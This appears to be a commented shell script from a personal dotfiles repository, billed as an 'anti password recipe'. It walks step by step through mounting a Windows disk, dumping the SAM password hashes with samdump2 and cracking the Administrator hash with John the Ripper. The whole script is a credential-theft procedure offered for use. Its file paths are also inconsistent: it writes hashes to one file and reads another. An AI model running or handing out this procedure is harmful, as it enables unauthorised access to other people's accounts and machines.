#                                                   ██
#                           ██████                 ░██
#  ██████ ██████████       ░██░░░██ ███     ██     ░██
# ░░██░░█░░██░░██░░██ █████░██  ░██░░██  █ ░██  ██████
#  ░██ ░  ░██ ░██ ░██░░░░░ ░██████  ░██ ███░██ ██░░░██
#  ░██    ░██ ░██ ░██      ░██░░░   ░████░████░██  ░██
# ░███    ███ ░██ ░██      ░██      ███░ ░░░██░░██████
# ░░░    ░░░  ░░  ░░       ░░      ░░░    ░░░  ░░░░░░
#
#  ▓▓▓▓▓▓▓▓▓▓
# ░▓ author ▓ ROGUE(X3) <rowanfeely.github.io>
# ░▓   code ▓ https://github.com/RowanFeely/dotfiles
# ░▓▓▓▓▓▓▓▓▓▓
# ░░░░░░░░░░

# AN ANTI PASSWORD RECIPE BY YOUR FAVORITE INTERNET VILLAIN ROGUETHREETIMES

# The fdisk command will allow you to see the partition table for one or many disk(s)
fdisk -l

# The mount command will mount a file system.  Since this is a Windows file system, I am specifying the "-t ntfs" option.
mount -t ntfs /dev/sda1 /mnt

# The df command reports on file system disk space usage.
df -k

# Since we mount the windows disk boot partition (/dev/sda1) on top of the /mnt directory, we have to cd into it to see its' contents.
cd /mnt

# The ls command will list the directories contents.
ls

# This is where the SAM database lives.  The SAM database is where all the Windows passwords live.
cd WINDOWS/system32/config

# ls the contents of the /WINDOWS/system32/config directory.
ls

# samdump2 dumps the Windows NT/2k/XP/Vista password hashes.
samdump2 SYSTEM SAM > root/hashes.txt

# Change directory into /root, because that is where we put our hive and hash files.
cd /root

# List out the files using a wildcard (*).
ls -l *.txt

# Determine the file type of the hash and hive files, where the hash file is (ASCII) and the hive file is (Compressed Binary).
file *.txt

# View the contents of the hash file
cat hash.txt

john /root/hash.txt -format=nt2 -users=Administrator

# After john is ran, it stores the results in the .john directory under the current user's home directory.  (e.g., /root/.john).
cd /root/.john

# Use "ls -l" to show the detail listing of the files.
ls -l

# View the contents of the john.pot file which contains the cracked passwords.
cat john.pot
